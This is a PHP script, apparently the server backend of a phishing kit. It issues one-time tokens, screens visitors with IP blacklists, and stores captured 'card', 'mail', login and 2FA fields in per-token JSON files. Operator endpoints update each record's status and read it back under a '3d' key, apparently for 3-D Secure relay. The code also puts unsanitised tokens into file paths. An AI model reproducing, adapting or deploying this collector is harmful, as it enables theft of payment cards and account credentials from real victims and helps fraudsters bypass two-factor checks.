<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET");
header("Access-Control-Allow-Headers: Content-Type");

function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function isIPBlacklisted($ip) {
    $blacklist = file('blacklist.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($ip, $blacklist);
}

function isIPInList($ip) {
    $ipsList = file('ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($ip, $ipsList);
}

function addIPToList($ip) {
    file_put_contents('ips.txt', $ip . PHP_EOL, FILE_APPEND);
}

function addIPToBlacklist($ip) {
    file_put_contents('blacklist.txt', $ip . PHP_EOL, FILE_APPEND);
}

function readdIP($ip) {
    $ipsList = file('ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $ipsList)) {
        return true;
    } else {
        file_put_contents('ips.txt', $ip . PHP_EOL, FILE_APPEND);
        return false;
    }
}

function isTokenActive($token) {
    $activeTokens = file('active.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($token, $activeTokens);
}

function moveTokenToInactive($token) {
    $activeTokens = file('active.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $newActiveTokens = array_diff($activeTokens, [$token]);
    file_put_contents('active.txt', implode(PHP_EOL, $newActiveTokens) . PHP_EOL);
    file_put_contents('inactive.txt', $token . PHP_EOL, FILE_APPEND);
}

function createTokenJsonFile($token, $ip, $userAgent, $referer, $card, $mail, $data1) {
    $userData = [
        "Token" => $token,
        "Ip" => $ip,
        "UserAgent" => $userAgent,
        "Referer" => $referer,
        "Status" => "undefined",
        "Log" => "undefined",
        "card" => "undefined",
        "mail" => "undefined",
        "data1" => "undefined",
    ];

    $filename = __DIR__ . "/users/{$token}.json";
    if (file_exists($filename)) {
        $jsonContent = file_get_contents($filename);
        $userData = json_decode($jsonContent, true);
    }

    if (isset($_GET['log'])) {
        $userData['Log'] = $_GET['log'];
    }
    if (isset($_GET['card'])) {
        $userData['card'] = $_GET['card'];
    }
    if (isset($_GET['mail'])) {
        $userData['mail'] = $_GET['mail'];
    }
    if (isset($_GET['data1'])) {
        $userData['data1'] = $_GET['data1'];
    }

    $jsonContent = json_encode($userData, JSON_PRETTY_PRINT);
    file_put_contents($filename, $jsonContent);

    $filename2fa = __DIR__ . "/users/2fa/{$token}.json";
    if (file_exists($filename2fa)) {
        $jsonContent2fa = file_get_contents($filename2fa);
        $data2fa = json_decode($jsonContent2fa, true);
    } else {
        $data2fa = [
            "Token" => $token,
            "Updated" => "NO",
            "par1" => "undefined",
            "par2" => "undefined",
            "par3" => "undefined",
            "par4" => "undefined",
            "par5" => "undefined",
            "par6" => "undefined"
        ];
    }

    $jsonContent2fa = json_encode($data2fa, JSON_PRETTY_PRINT);
    file_put_contents($filename2fa, $jsonContent2fa);
}

function clearFiles() {
    $files = ['ips.txt', 'blacklist.txt', 'active.txt', 'inactive.txt'];

    foreach ($files as $file) {
        if (file_exists($file)) {
            file_put_contents($file, '');
        } else {
            touch($file);
        }
    }

    $directory = __DIR__ . "/2fa";
    if (is_dir($directory)) {
        $files2fa = glob($directory . '/*');
        foreach ($files2fa as $file) {
            if (is_file($file)) {
                unlink($file);
            }
        }
    } else {
        mkdir($directory, 0777, true);
    }
}

function deleteTokenFile($token) {
    $filename = __DIR__ . "/users/{$token}.json";
    if (file_exists($filename)) {
        unlink($filename);
        return true;
    } else {
        return false;
    }
}

if (isset($_GET['token'])) {
    $token = $_GET['token'];
    $ip = getClientIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

    $response = [];

    if (readdIP($ip)) {
        $response['Readded'] = 'YES';
        $response['Ban'] = 'NO';
        $response['Token'] = 'readded';
    } else {
        $response['Readded'] = 'NO';

        if (isIPBlacklisted($ip)) {
            $response['Ban'] = 'YES';
            $response['Token'] = 'readded';
        } else {
            $response['Ban'] = 'NO';

            if (isTokenActive($token)) {
                $response['Token'] = '200OK';
                moveTokenToInactive($token);
                createTokenJsonFile($token, $ip, $userAgent, $referer, $_GET['card'] ?? '', $_GET['mail'] ?? '', $_GET['data1'] ?? '');
            } else {
                $response['Token'] = 'denied';
            }
        }
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    $response = [];

    if (readdIP($ip)) {
        $response['Readded'] = 'YES';
        $response['Ban'] = 'NO';
        $response['Token'] = 'readded';
    } else {
        $response['Readded'] = 'NO';
        addIPToList($ip);

        if (isIPBlacklisted($ip)) {
            $response['Ban'] = 'YES';
        } else {
            $response['Ban'] = 'NO';
        }
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['addb'])) {
    $ip = getClientIP();
    addIPToBlacklist($ip);
    $response = ['status' => '200OK'];

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['clear'])) {
    clearFiles();
    $response = ['status' => 'Files cleared'];

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['status'])) {
    $response = ['status' => '200 OK'];

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['user'])) {
    $token = $_GET['user'];
    $filename = __DIR__ . "/users/2fa/{$token}.json";

    if (file_exists($filename)) {
        $jsonContent = file_get_contents($filename);
        $data = json_decode($jsonContent, true);

        if (isset($_GET['Status'])) {
            $data['Status'] = $_GET['Status'];
        }
        if (isset($_GET['Log'])) {
            $data['Log'] = $_GET['Log'];
        }
        if (isset($_GET['card'])) {
            $data['card'] = $_GET['card'];
        }
        if (isset($_GET['mail'])) {
            $data['mail'] = $_GET['mail'];
        }
        if (isset($_GET['data1'])) {
            $data['data1'] = $_GET['data1'];
        }
        if (isset($_GET['data2'])) {
            $data['data2'] = $_GET['data2'];
        }
        if (isset($_GET['data3'])) {
            $data['data3'] = $_GET['data3'];
        }
        if (isset($_GET['par1'])) {
            $data['par1'] = $_GET['par1'];
        }
        if (isset($_GET['par2'])) {
            $data['par2'] = $_GET['par2'];
        }
        if (isset($_GET['par3'])) {
            $data['par3'] = $_GET['par3'];
        }

        $jsonContent = json_encode($data, JSON_PRETTY_PRINT);
        file_put_contents($filename, $jsonContent);

        $response = ['status' => '200 OK'];
    } else {
        $response = ['status' => 'User not found'];
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['3d'])) {
    $token = $_GET['3d'];
    $filename = __DIR__ . "/users/{$token}.json";

    if (file_exists($filename)) {
        $jsonContent = file_get_contents($filename);
        $response = json_decode($jsonContent, true);
    } else {
        $response = ['status' => 'Token not found'];
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['clr'])) {
    $token = $_GET['clr'];
    $filename = __DIR__ . "/users/{$token}.json";

    if (deleteTokenFile($token)) {
        $response = ['status' => 'File deleted'];
    } else {
        $response = ['status' => 'File not found'];
    }

    header('Content-Type: application/json');
    echo json_encode($response);
} else {
    $response = ['status' => '400 Bad Request'];

    header('Content-Type: application/json');
    echo json_encode($response);
}
?>

